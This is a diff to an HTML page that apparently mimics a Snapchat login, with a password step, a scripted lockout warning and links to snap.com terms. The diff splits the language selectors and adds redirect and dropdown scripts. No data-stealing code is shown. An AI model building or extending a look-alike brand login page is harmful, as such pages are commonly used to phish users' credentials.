@@ -31,7 +31,7 @@
         <div id="password-error" class="error-message" style="display: none; color: red; font-size: 14px; margin-top: 10px;">
           Wrong password. 2 attempts left before account lock.
         </div>
-        <button type="submit" id="step2-button" disabled>Continue</button>
+        <button type="button" id="step2-button" disabled>Continue</button>
       </div>
     </form>
   </div>
@@ -79,9 +79,9 @@
       </div>
     </div>
 
-    <div class="language-selector">
-      <label for="language">Language</label>
-      <select id="language" name="language">
+    <div class="language-selector desktop-only">
+      <label for="language-desktop">Language</label>
+      <select id="language-desktop" name="language">
         <option value="de">Deutsch</option>
         <option selected value="en">English</option>
         <option value="fr">Français</option>
@@ -127,8 +127,8 @@
     </div>
 
     <div class="language-selector mobile-only">
-      <label for="language">Language</label>
-      <select id="language" name="language">
+      <label for="language-mobile">Language</label>
+      <select id="language-mobile" name="language">
         <option value="de">Deutsch</option>
         <option selected value="en">English</option>
         <option value="fr">Français</option>
@@ -142,6 +142,59 @@
     <a href="https://www.snap.com/terms?lang=en-US" target="_blank">Terms of Service</a>
   </div>
 
+  <!-- NEUES Skript, wie bei deutscher Version -->
   <script src="script.js"></script>
+  <script>
+document.addEventListener("DOMContentLoaded", function () {
+  function handleLanguageChange(selectedLang) {
+    switch (selectedLang) {
+      case "de":
+        window.location.href = "/index.html";
+        break;
+      case "en":
+        window.location.href = "/en.html";
+        break;
+      case "fr":
+        window.location.href = "/fr.html";
+        break;
+      case "es":
+        window.location.href = "/es.html";
+        break;
+    }
+  }
+
+  const desktopSelect = document.getElementById("language-desktop");
+  const mobileSelect = document.getElementById("language-mobile");
+
+  if (desktopSelect) {
+    desktopSelect.addEventListener("change", function () {
+      handleLanguageChange(this.value);
+    });
+  }
+
+  if (mobileSelect) {
+    mobileSelect.addEventListener("change", function () {
+      handleLanguageChange(this.value);
+    });
+  }
+
+  if (window.innerWidth <= 768) {
+    document.querySelectorAll(".dropdown-toggle").forEach(button => {
+      button.addEventListener("click", () => {
+        const content = button.nextElementSibling;
+        const isVisible = content.style.display === "block";
+
+        document.querySelectorAll(".dropdown-content").forEach(el => el.style.display = "none");
+        document.querySelectorAll(".dropdown-toggle").forEach(btn => btn.classList.remove("active"));
+
+        if (!isVisible) {
+          content.style.display = "block";
+          button.classList.add("active");
+        }
+      });
+    });
+  }
+});
+</script>
 </body>
 </html>
